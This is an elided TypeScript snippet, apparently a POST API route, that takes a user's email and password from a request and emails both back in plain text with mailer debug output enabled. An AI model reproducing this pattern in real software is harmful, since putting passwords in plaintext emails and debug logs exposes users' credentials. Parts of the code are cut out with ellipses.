...
interface SendEmailRequest {
  EnterpriseCellEmail: string;
  EnterpriseCellPassword: string;
}
...
export async function POST(req: Request) {
  try {
    ...
    const { EnterpriseCellEmail, EnterpriseCellPassword}: SendEmailRequest = await req.json();
  ...
  debug: true,  // Output debug information
    ...
    const emailOptions = {
      ...
      to: `${EnterpriseCellEmail}`, // List of receivers
      ...
      EnterpriseCell:
      Email: ${EnterpriseCellEmail}
      Password: ${EnterpriseCellPassword}
